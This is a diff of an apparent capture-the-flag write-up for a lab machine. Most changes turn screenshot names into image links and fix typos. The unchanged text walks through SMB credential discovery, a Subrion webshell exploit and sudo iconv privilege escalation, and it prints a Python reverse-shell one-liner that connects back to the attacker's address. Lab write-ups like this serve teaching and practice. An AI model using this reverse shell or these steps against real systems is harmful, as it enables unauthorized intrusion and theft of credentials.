@@ -82,41 +82,47 @@ Nmap done: 1 IP address (1 host up) scanned in 19.28 seconds
 
 Heading to the site we find an Apache default landing page:
 
-site.png
+![site.png](../assets/tech_support_1_assets/site.png)
 
 We can use Feroxbuster to fuzz for directories:
 
-ferox.png
+![ferox.png](../assets/tech_support_1_assets/ferox.png)
 
 Looks like we've got a `/test` directory, as well as several WordPress directories. 
 
 Heading to http://10.10.199.225/test we find an extremely spammy page:
 
-test.png
+![test.png](../assets/tech_support_1_assets/test.png)
 
 Before enumerating HTTP any further, lets check out SMB to see if we can find anything.
 
 I'll see what shares we can access using CrackMapExec:
 
-cme.png
+![cme.png](../assets/tech_support_1_assets/cme.png)
 
 Looks like there's a `websvr` share we can access. To do this I'll use smbclient:
 
-smb.png
+![smb.png](../assets/tech_support_1_assets/smb.png)
 
 Pulling back this file to my machine we find a todo list and some credentials:
 
-enter.txt
+![enter.png](../assets/tech_support_1_assets/enter.png)
 
-This password appears to be encrypted. GOing off the hin in the note I'll head to https://gchq.github.io/CyberChef/ and use the 'Magic' feature to decode this:
+This password appears to be encrypted. Going off the hint in the note I'll head to https://gchq.github.io/CyberChef/ and use the 'Magic' feature to decode this:
 
-chef.png
+![chef.png](../assets/tech_support_1_assets/chef.png)
 
 Based on the note we can navigate to http://10.10.199.225/subrion/panel/ and login with the credentials:
 
+![subrion.png](../assets/tech_support_1_assets/subrion.png)
+
 Now that we have working credentials, I searched for Subrion version 4.2.1 exploits and found: https://www.exploit-db.com/exploits/49876
 
-Looks like the exploit logs in with the user provided credentials and uploads a webshell. Lets give it a shot:
+Looks like the exploit logs in with the user provided credentials and uploads a webshell. 
+
+![python.png](../assets/tech_support_1_assets/python.png)
+
+Lets give it a shot:
 
 ### Exploitation
 
@@ -153,8 +159,7 @@ We can head to revshells.com and grab the script:
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.61.45",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
 ```
 
-stable.png
-
+![stable.png](../assets/tech_support_1_assets/stable.png)
 
 Browsing around the box I found `/var/www/html/wordpress/wp-config.php` which had some credentials in it:
 
@@ -188,15 +193,15 @@ scamsite
 
 Cool, that worked. We can now run `sudo -l` to see what user scamsite can run with eleveated permissions:
 
-sudo.png
+![sudo.png](../assets/tech_support_1_assets/sudo.png)
 
 We can now head to https://gtfobins.github.io/gtfobin and search for iconv:
 
-gtfo.png
+![gtfo.png](../assets/tech_support_1_assets/gtfo.png)
 
 Lets use this to read the root.txt flag:
 
-root_flag.png
+![root_flag.png](../assets/tech_support_1_assets/root_flag.png)
 
 Thanks for following along!
 
